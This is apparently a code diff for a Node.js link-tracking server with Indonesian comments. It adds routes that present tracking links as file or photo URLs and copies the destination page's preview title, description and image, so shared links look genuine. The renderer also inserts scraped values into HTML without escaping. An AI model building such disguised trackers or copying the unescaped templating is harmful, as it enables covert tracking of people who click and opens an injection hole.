@@ -4,6 +4,9 @@ const mongoose = require('mongoose');
 const path = require('path');
 const cors = require('cors');
 const dotenv = require('dotenv');
+const getMetaData = require('metadata-scraper');
+const fetch = require('node-fetch');
+const fs = require('fs');
 
 // Load environment variables
 dotenv.config();
@@ -45,6 +48,40 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(cors());
 app.use(express.static('public'));
+
+// Fungsi untuk mendapatkan metadata dari URL
+async function fetchUrlMetadata(url) {
+    try {
+        const metadata = await getMetaData(url);
+        return {
+            title: metadata.title || 'Shared Link',
+            description: metadata.description || 'Click to open the link',
+            image: metadata.image || '',
+            url: url
+        };
+    } catch (error) {
+        console.error('Error fetching metadata:', error);
+        return {
+            title: 'Shared Link',
+            description: 'Click to open the link',
+            image: '',
+            url: url
+        };
+    }
+}
+
+// Fungsi untuk merender template HTML dengan metadata
+function renderTemplate(templatePath, data) {
+    let template = fs.readFileSync(templatePath, 'utf8');
+
+    // Ganti placeholder dengan nilai sebenarnya
+    Object.keys(data).forEach(key => {
+        const placeholder = new RegExp(`{{${key}}}`, 'g');
+        template = template.replace(placeholder, data[key]);
+    });
+
+    return template;
+}
 
 // API Routes
 
@@ -180,6 +217,43 @@ app.post('/api/track/:id', async (req, res) => {
     }
 });
 
+// Redirect based on custom URL if available
+app.get('/t/:id', async (req, res) => {
+    try {
+        const { id } = req.params;
+        const link = await Link.findOne({ id });
+
+        if (!link) {
+            return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
+        }
+
+        if (link.custom_url) {
+            // Fetch metadata dari URL tujuan
+            const metadata = await fetchUrlMetadata(link.custom_url);
+
+            // Render template dengan metadata
+            const htmlContent = renderTemplate(
+                path.join(__dirname, 'public', 'track.html'),
+                {
+                    og_title: metadata.title,
+                    og_description: metadata.description,
+                    og_image: metadata.image,
+                    og_url: metadata.url,
+                    redirect_url: link.custom_url
+                }
+            );
+
+            // Kirim HTML yang sudah dirender
+            res.send(htmlContent);
+        } else {
+            res.sendFile(path.join(__dirname, 'public', 'tracker.html'));
+        }
+    } catch (error) {
+        console.error('Server error:', error);
+        res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
+    }
+});
+
 // Handle file route for masked URLs
 app.get('/file/:filename', async (req, res) => {
     try {
@@ -200,8 +274,27 @@ app.get('/file/:filename', async (req, res) => {
             return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
         }
 
-        // Redirect to track route with found ID
-        res.redirect(`/track.html?id=${matchedLink.id}&type=file`);
+        if (matchedLink.custom_url) {
+            // Fetch metadata dari URL tujuan
+            const metadata = await fetchUrlMetadata(matchedLink.custom_url);
+
+            // Render template dengan metadata
+            const htmlContent = renderTemplate(
+                path.join(__dirname, 'public', 'track.html'),
+                {
+                    og_title: metadata.title,
+                    og_description: metadata.description,
+                    og_image: metadata.image,
+                    og_url: metadata.url,
+                    redirect_url: matchedLink.custom_url
+                }
+            );
+
+            // Kirim HTML yang sudah dirender
+            res.send(htmlContent);
+        } else {
+            res.redirect(`/track.html?id=${matchedLink.id}&type=file`);
+        }
     } catch (error) {
         console.error('Server error:', error);
         res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
@@ -226,32 +319,52 @@ app.get('/photo/:filename', async (req, res) => {
             return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
         }
 
-        // Redirect to track page with this ID
-        res.redirect(`/track.html?id=${id}&type=photo`);
+        if (link.custom_url) {
+            // Fetch metadata dari URL tujuan
+            const metadata = await fetchUrlMetadata(link.custom_url);
+
+            // Render template dengan metadata
+            const htmlContent = renderTemplate(
+                path.join(__dirname, 'public', 'track.html'),
+                {
+                    og_title: metadata.title,
+                    og_description: metadata.description,
+                    og_image: metadata.image,
+                    og_url: metadata.url,
+                    redirect_url: link.custom_url
+                }
+            );
+
+            // Kirim HTML yang sudah dirender
+            res.send(htmlContent);
+        } else {
+            res.redirect(`/track.html?id=${id}&type=photo`);
+        }
     } catch (error) {
         console.error('Server error:', error);
         res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
     }
 });
 
-// Redirect based on custom URL if available
-app.get('/t/:id', async (req, res) => {
+// Delete a tracking link
+app.delete('/api/links/:id', async (req, res) => {
     try {
         const { id } = req.params;
-        const link = await Link.findOne({ id });
+
+        // Find and delete the link
+        const link = await Link.findOneAndDelete({ id });
 
         if (!link) {
-            return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
+            return res.status(404).json({ error: 'Link not found' });
         }
 
-        if (link.custom_url) {
-            res.redirect(`/track.html?id=${id}&redirect=${encodeURIComponent(link.custom_url)}`);
-        } else {
-            res.sendFile(path.join(__dirname, 'public', 'tracker.html'));
-        }
+        // Delete all visits associated with this link
+        await Visit.deleteMany({ link_id: id });
+
+        res.json({ success: true, message: 'Link and associated visits deleted successfully' });
     } catch (error) {
         console.error('Server error:', error);
-        res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
+        res.status(500).json({ error: error.message });
     }
 });
 
